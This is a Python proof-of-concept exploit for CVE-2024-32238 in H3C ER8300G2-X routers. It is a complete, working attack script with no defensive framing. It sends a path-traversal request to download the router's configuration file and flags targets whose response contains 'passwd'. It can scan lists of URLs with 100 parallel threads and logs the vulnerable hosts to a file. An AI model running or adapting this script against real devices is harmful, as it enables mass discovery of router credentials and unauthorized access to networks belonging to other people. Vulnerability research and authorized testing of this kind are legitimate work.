import requests,argparse,sys,json
from multiprocessing.dummy import Pool

requests.packages.urllib3.disable_warnings()
GREEN = '\033[92m'  # 输出颜色
RESET = '\033[0m'


def banner():
    test = """
 
 ██░ ██  ▄▄▄       ██▀███  ▓█████▄  ▒█████    ▄████ 
▓██░ ██▒▒████▄    ▓██ ▒ ██▒▒██▀ ██▌▒██▒  ██▒ ██▒ ▀█▒
▒██▀▀██░▒██  ▀█▄  ▓██ ░▄█ ▒░██   █▌▒██░  ██▒▒██░▄▄▄░
░▓█ ░██ ░██▄▄▄▄██ ▒██▀▀█▄  ░▓█▄   ▌▒██   ██░░▓█  ██▓
░▓█▒░██▓ ▓█   ▓██▒░██▓ ▒██▒░▒████▓ ░ ████▓▒░░▒▓███▀▒
 ▒ ░░▒░▒ ▒▒   ▓▒█░░ ▒▓ ░▒▓░ ▒▒▓  ▒ ░ ▒░▒░▒░  ░▒   ▒ 
 ▒ ░▒░ ░  ▒   ▒▒ ░  ░▒ ░ ▒░ ░ ▒  ▒   ░ ▒ ▒░   ░   ░ 
 ░  ░░ ░  ░   ▒     ░░   ░  ░ ░  ░ ░ ░ ░ ▒  ░ ░   ░ 
 ░  ░  ░      ░  ░   ░        ░        ░ ░        ░ 
                            ░                       
                                                                                                                    
                                version:1.1.0                     
                                author:Hardog
"""
    print(test)


def main():
    banner()

    parser = argparse.ArgumentParser(description='CVE-2024-32238 H3C ER8300G2-X-密码泄露漏洞')
    parser.add_argument('-u', '--url', dest='url', type=str, help='Please input link')
    parser.add_argument('-f', '--file', dest='file', type=str, help='File Path')
    args = parser.parse_args()

    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        url_list = []
        with open(args.file, "r", encoding="utf-8") as f:
            for url in f.readlines():
                url_list.append(url.strip())
        mp = Pool(100)
        mp.map(poc, url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usage:\n\t python3 {sys.argv[0]} -h")


def poc(target):
    payload_url = '/userLogin.asp/../actionpolicy_status/../ER8300G2-X.cfg'
    url = target + payload_url
    
    headers = {
        'User-Agent':'Mozilla/5.0 (X11; CrOS aarch64 15236.9.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36',
        'Connection':'close',
        'Accept-Encoding':'gzip'
    }

    proxies = {
        'http':'http://127.0.0.1:8080',
        'https':'http://127.0.0.1:8080',
    }

    try:
        response1 = requests.get(url=url,headers=headers,verify=False,proxies=proxies,timeout=5)

        # 检查响应状态码
        if response1.status_code == 200 and "passwd" in response1.text:
            print(f"{GREEN}[+] 存在密码泄露漏洞！{target}\n{RESET}")
            with open('result.txt', 'a', encoding='utf-8') as fp:
                fp.write(target + '\n')

        else:
            print(f"[-] 不存在密码泄露漏洞!")

    except Exception as e:
        print("[*] 无法访问")

if __name__ == '__main__':
    main()